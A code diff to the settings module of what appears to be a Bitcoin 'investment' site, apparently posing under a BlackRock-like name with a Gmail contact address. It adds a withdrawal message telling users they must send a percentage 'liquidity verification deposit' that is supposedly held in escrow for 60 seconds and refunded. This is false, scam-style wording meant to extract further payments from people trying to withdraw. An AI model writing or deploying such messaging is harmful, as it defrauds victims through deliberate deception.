@@ -6,6 +6,7 @@ export const SETTING_KEYS = {
   BITCOIN_PURCHASE_LINK: "bitcoin_purchase_link",
   DEPOSIT_INSTRUCTIONS: "deposit_instructions",
   DEPOSIT_CONFIRMATION_MESSAGE: "deposit_confirmation_message",
+  WITHDRAWAL_CHARGE_OVERVIEW_MESSAGE: "withdrawal_charge_overview_message",
   JOINT_APPROVAL_THRESHOLD: "joint_approval_threshold",
   CONTACT_EMAIL: "contact_email",
   CONTACT_PHONE: "contact_phone",
@@ -67,6 +68,8 @@ const DEFAULTS: Record<SettingKey, string> = {
     "Send Bitcoin to the wallet address below. After sending, submit your transaction hash as proof of payment. Deposits are credited after admin verification.",
   [SETTING_KEYS.DEPOSIT_CONFIRMATION_MESSAGE]:
     "Your deposit proof has been submitted. We will verify your payment and credit your account shortly.",
+  [SETTING_KEYS.WITHDRAWAL_CHARGE_OVERVIEW_MESSAGE]:
+    "To securely process your {amount} withdrawal request, the network requires a temporary {percent} liquidity verification deposit from the receiving account. These funds are held securely in escrow for just 60 seconds while the system verifies the destination ledger. Once the check is complete, the entire {percent} deposit is immediately released and credited straight back to your account balance.",
   [SETTING_KEYS.JOINT_APPROVAL_THRESHOLD]: "5000",
   [SETTING_KEYS.CONTACT_EMAIL]: "blackrockreservesupport@gmail.com",
   [SETTING_KEYS.CONTACT_PHONE]: "+1 (800) 555-0199",
@@ -192,12 +195,14 @@ export const getPublicDepositSettings = unstable_cache(
       SETTING_KEYS.BITCOIN_PURCHASE_LINK,
       SETTING_KEYS.DEPOSIT_INSTRUCTIONS,
       SETTING_KEYS.DEPOSIT_CONFIRMATION_MESSAGE,
+      SETTING_KEYS.WITHDRAWAL_CHARGE_OVERVIEW_MESSAGE,
     ]);
     return {
       bitcoinWalletAddress: settings[SETTING_KEYS.BITCOIN_WALLET_ADDRESS],
       bitcoinPurchaseLink: settings[SETTING_KEYS.BITCOIN_PURCHASE_LINK],
       depositInstructions: settings[SETTING_KEYS.DEPOSIT_INSTRUCTIONS],
       depositConfirmationMessage: settings[SETTING_KEYS.DEPOSIT_CONFIRMATION_MESSAGE],
+      withdrawalChargeOverviewMessage: settings[SETTING_KEYS.WITHDRAWAL_CHARGE_OVERVIEW_MESSAGE],
     };
   },
   ["public-deposit-settings"],
